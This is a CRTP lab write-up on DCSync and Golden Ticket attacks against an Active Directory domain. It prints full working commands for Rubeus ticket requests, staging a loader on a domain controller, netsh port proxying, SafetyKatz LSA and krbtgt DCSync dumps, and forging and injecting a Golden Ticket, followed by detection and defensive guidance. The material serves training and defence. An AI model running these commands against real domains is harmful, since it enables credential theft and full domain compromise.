# CRTP — Golden Ticket & DCSync

**Date:** 24 August 2026

> **Lab-only documentation:** The techniques described here were performed in an authorized CRTP training environment. Sensitive keys and credential material are intentionally redacted.

---

## 1. Objective

The objective of this lab is to understand how compromise of the **KRBTGT account secret** can be used to forge Kerberos Golden Tickets.

The lab demonstrates:

* Obtaining privileged access to the Domain Controller.
* Extracting domain credential material.
* Understanding **DCSync**.
* Retrieving the `krbtgt` NTLM/AES keys.
* Understanding the information required to create a Golden Ticket.
* Generating a Golden Ticket with Rubeus.
* Injecting the forged ticket into a process.
* Using the resulting Kerberos identity to access domain resources.

---

## 2. Attack-Path Mental Model

```text
Privileged Domain Account
          ↓
Reach Domain Controller
          ↓
Extract domain secrets
          ↓
DCSync krbtgt
          ↓
Obtain KRBTGT key
          ↓
Obtain Domain SID
          ↓
Forge Golden Ticket
          ↓
Inject ticket
          ↓
Kerberos authentication
          ↓
Domain-wide privileged access
```

The critical difference from ordinary credential theft is that the attacker obtains the secret associated with the **KRBTGT account**, which is responsible for Kerberos ticket signing in the domain.

---

# 3. Starting a Domain Admin Context

The lab begins by creating a process running with the privileges of the `svcadmin` account.

The supplied training command is:

```cmd
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:<LAB_SVCADMIN_AES256_KEY> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

### Important parameters

| Parameter        | Purpose                                     |
| ---------------- | ------------------------------------------- |
| `asktgt`         | Requests a Kerberos TGT                     |
| `/user:svcadmin` | Specifies the account                       |
| `/aes256:<key>`  | Uses the account's AES-256 key              |
| `/opsec`         | Uses OPSEC-oriented configuration           |
| `/createnetonly` | Creates a separate logon context            |
| `/show`          | Displays the created process/context        |
| `/ptt`           | Passes the obtained ticket into the process |

The actual AES key from the lab is intentionally represented as:

```text
<LAB_SVCADMIN_AES256_KEY>
```

and should **not** be committed to GitHub.

---

# 4. Copy Tooling to the Domain Controller

The lab stages `Loader.exe` on the Domain Controller:

```cmd
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
```

Conceptually:

```text
Student VM
    |
    | SMB / Administrative Share
    ↓
dcorp-dc
    |
    └── C:\Users\Public\Loader.exe
```

This demonstrates transferring tooling to the target system using an administrative share.

---

# 5. Remote Access to the Domain Controller

The lab establishes a remote command shell:

```cmd
winrs -r:dcorp-dc cmd
```

Conceptually:

```text
Student VM
     ↓
WinRS / WinRM
     ↓
dcorp-dc
     ↓
cmd.exe
```

This provides the remote execution context required for the subsequent lab steps.

---

# 6. Configure Port Proxy

The Domain Controller is configured with a port proxy:

```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
```

Conceptually:

```text
dcorp-dc:8080
      ↓
Port Proxy
      ↓
172.16.100.x:80
```

This allows the Domain Controller to retrieve the lab tooling through the configured forwarding path.

### View configured proxies

```cmd
netsh interface portproxy show all
```

### Defensive significance

Unexpected `netsh interface portproxy` rules can be investigated as potential indicators of lateral movement or network tunneling.

---

# 7. Extracting LSA Secrets

The lab uses SafetyKatz to access LSA-related secrets:

```cmd
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
```

The important concept is:

```text
Privileged execution
       ↓
LSA secret access
       ↓
Authentication material
```

This activity should only be performed against systems explicitly authorized for testing.

---

# 8. DCSync

The key step in the Golden Ticket attack path is **DCSync**.

DCSync abuses Active Directory replication functionality to request credential information from a Domain Controller as though the requesting principal were another domain controller.

The lab command is:

```cmd
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

The important target is:

```text
dcorp\krbtgt
```

The result contains credential material associated with the `krbtgt` account, including Kerberos keys.

---

# 9. Why KRBTGT Is Important

The `krbtgt` account is a special Active Directory account used by the Kerberos Key Distribution Center.

Its secret is used to protect/sign Kerberos tickets.

Therefore:

```text
KRBTGT secret
      ↓
Ability to forge Kerberos tickets
      ↓
Golden Ticket
```

This makes compromise of the KRBTGT secret significantly more serious than compromise of an ordinary domain user.

---

# 10. Information Required for a Golden Ticket

The lab demonstrates obtaining the information required to construct a Golden Ticket.

Important values include:

```text
KRBTGT AES key
Domain SID
Domain name
Target username
User RID
Group memberships
Domain Controller information
```

The key relationship is:

```text
KRBTGT key
      +
Domain identity information
      ↓
Forged Kerberos TGT
```

---

# 11. Generate the Golden Ticket Command

The lab uses Rubeus to generate an OPSEC-oriented Golden Ticket command:

```cmd
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:<LAB_KRBTGT_AES256_KEY> /sid:S-1-5-21-<LAB_DOMAIN_SID> /ldap /user:Administrator /printcmd
```

### Important parameters

| Parameter             | Meaning                                            |
| --------------------- | -------------------------------------------------- |
| `evasive-golden`      | Golden Ticket generation functionality             |
| `/aes256:<key>`       | KRBTGT AES-256 key                                 |
| `/sid:<SID>`          | Domain Security Identifier                         |
| `/ldap`               | Retrieves required domain information through LDAP |
| `/user:Administrator` | Identity represented by the ticket                 |
| `/printcmd`           | Prints the generated command                       |

The `/ldap` option demonstrates that Rubeus can retrieve additional domain information through LDAP.

The exact number and nature of LDAP queries should be considered from a detection perspective because directory-service activity can provide useful telemetry.

---

# 12. Golden Ticket Generation

The lab then uses the generated command to create and inject a Golden Ticket.

A sanitized representation is:

```cmd
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:<LAB_KRBTGT_AES256_KEY> /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-<LAB_DOMAIN_SID> /pwdlastset:"<LAB_DATE>" /minpassage:1 /logoncount:<LAB_COUNT> /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```

### Important parameters

| Parameter  | Meaning                                           |
| ---------- | ------------------------------------------------- |
| `/aes256`  | KRBTGT AES key used to sign the forged ticket     |
| `/user`    | Username represented by the ticket                |
| `/id`      | User RID                                          |
| `/pgid`    | Primary group RID                                 |
| `/domain`  | Fully qualified domain name                       |
| `/sid`     | Domain SID                                        |
| `/netbios` | NetBIOS domain name                               |
| `/groups`  | Group memberships represented in the ticket       |
| `/dc`      | Domain Controller                                 |
| `/ptt`     | Passes the forged ticket into the current process |

---

# 13. Understanding the Group RIDs

The lab command includes several group identifiers:

```text
544
512
520
513
```

These correspond to well-known Active Directory groups, including highly privileged groups such as:

```text
512 → Domain Admins
```

and:

```text
520 → Group Policy Creator Owners
```

The important concept is that the forged ticket can contain authorization data representing privileged group membership.

---

# 14. `/ptt` — Pass the Ticket

The `/ptt` parameter means:

> **Pass the Ticket**

After the Golden Ticket is created, `/ptt` attempts to inject it into the current logon session.

Conceptually:

```text
Forged TGT
    ↓
/ptt
    ↓
Ticket injected
    ↓
Kerberos authentication
    ↓
Access resources as represented identity
```

This is why the command can subsequently be used to access domain resources.

---

# 15. Verify Domain Access

The lab verifies the resulting context using:

```cmd
winrs -r:dcorp-dc cmd
```

Conceptually:

```text
Golden Ticket
     ↓
Kerberos authentication
     ↓
Privileged identity
     ↓
Domain resource access
```

The important security lesson is that possession of the KRBTGT secret can enable an attacker to construct authentication tickets that appear legitimate to domain services.

---

# 16. DCSync vs Golden Ticket

These are related but different concepts.

### DCSync

```text
DCSync
  ↓
Abuse directory replication
  ↓
Retrieve credential material
  ↓
Obtain KRBTGT key
```

### Golden Ticket

```text
KRBTGT key
  ↓
Forge Kerberos TGT
  ↓
Inject ticket
  ↓
Authenticate as privileged identity
```

Therefore:

> **DCSync can provide the secret required for a Golden Ticket, while Golden Ticket attacks use that secret to forge Kerberos authentication.**

---

# 17. Complete Attack Path

```text
1. Obtain privileged domain context
                ↓
2. Reach the Domain Controller
                ↓
3. Stage required tooling
                ↓
4. Access privileged authentication material
                ↓
5. Perform DCSync against krbtgt
                ↓
6. Obtain KRBTGT Kerberos key
                ↓
7. Obtain domain SID and domain information
                ↓
8. Construct Golden Ticket
                ↓
9. Inject ticket with /ptt
                ↓
10. Authenticate using Kerberos
                ↓
11. Access authorized domain resources
```

---

# 18. Detection Perspective

Golden Ticket attacks can be difficult to detect because the forged ticket is cryptographically associated with the KRBTGT secret.

However, defenders can investigate anomalies around the authentication process.

### Kerberos telemetry

Investigate:

* Unusual TGT requests
* Abnormal ticket lifetimes
* Unexpected encryption types
* Authentication from unusual hosts
* Tickets for accounts that do not normally perform certain activities

### Domain Controller telemetry

DCSync activity can be investigated through directory replication-related events and unusual replication requests.

Relevant telemetry may include:

```text
Windows Security Event ID 4662
```

particularly when monitoring for suspicious directory-object access involving replication permissions.

### Process telemetry

Monitor for suspicious execution of tools commonly associated with credential access or Kerberos manipulation.

Potential sources include:

```text
Sysmon Event ID 1
PowerShell Event ID 4104
EDR process telemetry
Windows Security logs
Domain Controller logs
```

### Network telemetry

Investigate:

* LDAP queries
* SMB activity
* WinRM/WinRS activity
* Unusual Domain Controller connections
* Unexpected traffic from workstations to Domain Controllers

### Port Proxy

Monitor unexpected:

```cmd
netsh interface portproxy
```

configuration.

---

# 19. Defensive Lessons

The Golden Ticket attack demonstrates why the KRBTGT account requires special protection.

Important defensive measures include:

* Minimize Domain Admin logons to ordinary systems.
* Protect Domain Controllers as highly sensitive assets.
* Monitor replication permissions.
* Monitor unusual directory replication activity.
* Monitor privileged authentication.
* Investigate anomalous Kerberos behavior.
* Restrict administrative access to Domain Controllers.
* Use dedicated administrative workstations where possible.
* Maintain strong separation between normal user activity and privileged administration.
* Rotate the KRBTGT password appropriately following confirmed compromise.

---

# 20. CRTP Takeaways

The most important concepts to remember are:

```text
DCSync
   ↓
Obtain KRBTGT secret
   ↓
Golden Ticket
   ↓
Forge Kerberos TGT
   ↓
Pass the ticket
   ↓
Privileged domain access
```

### Remember the distinction

```text
DCSync = obtain the secret

Golden Ticket = use the secret to forge authentication
```

---

# 21. Revision Questions

1. What is the purpose of the `krbtgt` account?
2. What is DCSync?
3. What Active Directory functionality does DCSync abuse?
4. Why is the KRBTGT secret particularly sensitive?
5. What information is required to create a Golden Ticket?
6. What is a Kerberos TGT?
7. What does `/ptt` do?
8. What is the difference between DCSync and a Golden Ticket?
9. Why can Golden Tickets be difficult to detect?
10. What telemetry can help identify DCSync activity?
11. What does Event ID 4662 represent?
12. Why should Domain Controllers receive stronger monitoring than ordinary servers?
13. Why should privileged accounts avoid unnecessary logons to workstations?
14. What should defenders do if the KRBTGT secret is believed to be compromised?

---

# 22. One-Line Memory Aid

> **DCSync the KRBTGT secret → obtain the domain information → forge a Kerberos TGT → pass the ticket → access domain resources as the forged identity.**

---

# 23. Final Takeaway

The most important lesson from this lab is that **KRBTGT compromise can fundamentally undermine Kerberos authentication within an Active Directory domain**.

The attack chain can be summarized as:

```text
Privileged Access
       ↓
DCSync
       ↓
KRBTGT Key
       ↓
Golden Ticket
       ↓
Kerberos TGT
       ↓
Ticket Injection
       ↓
Privileged Domain Access
```

From a penetration-testing perspective, this demonstrates the impact of obtaining the KRBTGT secret.

From a defensive perspective, it highlights why **Domain Controllers, privileged accounts, directory replication permissions, and Kerberos authentication telemetry** must be treated as high-priority security controls.

---

## Disclaimer

This write-up is intended for an **authorized CRTP/Moneycorp training environment** only.

Do not use these techniques against systems without explicit authorization.

**Never commit real passwords, NTLM hashes, AES keys, Kerberos tickets, private keys, or other authentication secrets to GitHub.** All environment-specific secrets in this documentation have been replaced with placeholders.
